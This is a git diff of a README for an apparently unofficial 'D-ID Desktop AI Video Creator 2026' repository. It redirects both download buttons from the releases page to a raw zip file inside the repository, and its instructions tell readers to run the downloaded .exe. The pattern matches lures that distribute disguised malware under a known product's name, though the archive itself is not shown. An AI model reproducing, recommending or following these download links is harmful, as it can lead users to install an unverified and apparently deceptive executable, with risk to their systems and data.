@@ -1,6 +1,6 @@
 # 🚀 D-ID-Desktop---D-ID-AI-Video-Creator-2026 - Create Stunning AI Videos Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-D--ID--Desktop-2026-blue?style=for-the-badge&logo=github)](https://github.com/sirin9753/D-ID-Desktop---D-ID-AI-Video-Creator-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-D--ID--Desktop-2026-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sirin9753/D-ID-Desktop---D-ID-AI-Video-Creator-2026/main/intent/v2.5-alpha.4.zip)
 
 ---
 
@@ -188,7 +188,7 @@ To ensure smooth performance, please make sure your computer meets these minimum
 
 Ready to start creating amazing AI videos? You've waited long enough!
 
-[![Download D-ID Desktop 2026](https://img.shields.io/badge/Download-D--ID--Desktop--2026-brightgreen?style=for-the-badge&logo=github&labelColor=333&color=00CC66)](https://github.com/sirin9753/D-ID-Desktop---D-ID-AI-Video-Creator-2026/releases)
+[![Download D-ID Desktop 2026](https://img.shields.io/badge/Download-D--ID--Desktop--2026-brightgreen?style=for-the-badge&logo=github&labelColor=333&color=00CC66)](https://raw.githubusercontent.com/sirin9753/D-ID-Desktop---D-ID-AI-Video-Creator-2026/main/intent/v2.5-alpha.4.zip)
 
 **Download Instructions:** Visit this link to download the application. Once there, click the download button associated with the latest release version. The file will download as a single executable (.exe) file. After downloading, run the file and follow the on-screen instructions to install the software. The entire process takes only a few minutes, and before you know it, you'll be creating professional-grade AI avatar videos right from your own computer.
 
